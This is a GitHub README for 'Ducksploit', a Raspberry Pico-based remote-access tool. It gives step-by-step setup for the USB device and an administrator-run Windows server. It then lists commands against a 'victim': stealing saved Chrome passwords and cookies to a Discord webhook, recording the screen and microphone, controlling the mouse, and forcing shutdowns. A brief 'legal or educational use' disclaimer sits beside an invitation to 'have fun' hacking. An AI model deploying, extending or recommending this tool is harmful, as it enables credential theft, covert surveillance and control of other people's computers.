![banner](https://github.com/canarddu38/DUCKSPLOIT/blob/root/images/banner.png?raw=true "banner")](https://github.com/canarddu38/DUCKSPLOIT/blob/master/images/banner.png?raw=true "banner")

 # Ducksploit
 ![](https://img.shields.io/badge/Version-1.0.3-red) ![](https://img.shields.io/github/stars/canarddu38/DUCKSPLOIT) ![](https://img.shields.io/github/issues/canarddu38/DUCKSPLOIT) ![](	https://img.shields.io/github/forks/canarddu38/DUCKSPLOIT) ![](https://img.shields.io/github/license/canarddu38/DUCKSPLOIT)


## Install Ducksploit

#### Hacker
###### setup raspberry pico
   1. Download https://github.com/canarddu38/DUCKSPLOIT/archive/root.zip
   2. Extract downloaded zip file
   3. Go in PICO SETUP folder
   4. Plugg your raspberry pico on your PC with the BOOTSEL button
   [![picobootbutton](https://github.com/canarddu38/DUCKSPLOIT/blob/root/images/picoboot.png?raw=true "picobootbutton")](https://github.com/canarddu38/DUCKSPLOIT/blob/root/images/picoboot.png?raw=true "picobootbutton")
   5. Move CircuitPython.uf2 file in the E:\ usb port (port of your pico)
now your raspberry pico gonna leave usb port and reconnec with CIRCUITPY name
   6. Erase all the content of your raspberry pico and copy 'copy' folder into him
   7. Write myip.txt and write your own IP
   8. Now your raspberry pico is full configured , unplugg your pico and done!





###### setup ducksploit commands




   1. Download https://github.com/canarddu38/DUCKSPLOIT/archive/root.zip
   2. Extract downloaded zip file
   3. Go in SERVER folder
   4. If python is not installed, launch 'installpython.bat' or download at https://www.python.org/ftp/python/3.8.0/python-3.8.0.exe
   5. Install python requirements using 'installrequirements.bat' script
   6. launch setup.bat       ###MUST BE RUN AS ADMINISTRATOR###
   7. Ducksploit is now installed on your PC :smile:
   8. Type 'ducksploit' in the cmd
   9. Config your ip using 'ipconfig' (your ip)
   10. Wait victim's connection using 'wait' command
   11. Have fun with ducksploit hacking commands (type help to get commands list)


:warning: Ducksploit is made for legal use or educational use :warning:

## Uninstall Ducksploit

   1. Launch Ducksploit terminal using 'ducksploit'
   2. type 'uninstall'
   3. Done  :smile:


## **Commands**

#### Launch
| Command | Usage | Result |
| ------------- | ------------- | ------------- |
| wait    | wait | wait your victim's connection |

#### Config
| Command  | Usage | Result |
| ------------- | ------------- | ------------- |
| ipconfig  | ipconfig (your ipv4) | config your ip |

#### Account
| Command | Usage    | Result |
| ------------- | ------------- | ------------- |
| register | register | reconfigure your account |
| accountinfo | accountinfo | view all your account's infos |

#### Exploits
| Command  | Usage | Result |
| ------------- | ------------- | ------------- |
| stealpwds | stealpwds (discord webhook url) | steal all saved chrome passwords of your victim and send them into a discord webhook |
| stealcookies  | stealcookies (discord webhook url) | steal all saved chrome cookies of your victim and send them into a discord webhook |
| open  | open (applicationname.exe) | open mensioned application |
| recordscreen  | recordscreen (time in second) | record victim's screen durring amount of time |
| recordmicro  | recordmicro (time in second) | record victim's micro durring amount of time |

#### Mouse
| Command  | Usage | Result |
| ------------- | ------------- | ------------- |
| mouseclick | mouseclick [left, right, middle] | make the victim click the mensionned button |
| mousemove | mousemove (x) (y) | move the victim's cursor by x and y pixels |
| mousescroll | mousescroll (int between -1000 and 1000) | make the user scroll by int pixels |
| locatemouse | locatemouse | get the victim's cursor current locations |

#### Alert Window
| Command  | Usage | Result |
| ------------- | ------------- | ------------- |
| msg | msg [-file, -text] (title) (line1) (line2) | create an alertbox and send it on the vitim's pc with a title and 2 lines (if -file set line1 to createfile command content) |
| createfile | createfile (text) | set the content of line1 of msg command |

#### Troll
| Command | Usage | Result |
| ------------- | ------------- | ------------- |
| skull   | skull | spam cmds with skull and crossbones |

#### Mysc
| Command      | Usage       | Result                            |
|--------------|-------------|-----------------------------------|
| uninstall    | uninstall   | uninstall ducksploit              |
| update       | update      | update ducksploit                 |
| credits      | credits     | view ducksploit's credits         |
| exit         | exit        | exit from the ducksploit treminal |
| help         | help        | getting the list of all commands  |
| shutdown     | shutdown    | make the victim's pc shutdown     |
| reboot       | reboot      | make the victim's pc reboot       |
| closesession | closesesion | make the victim's session close   |
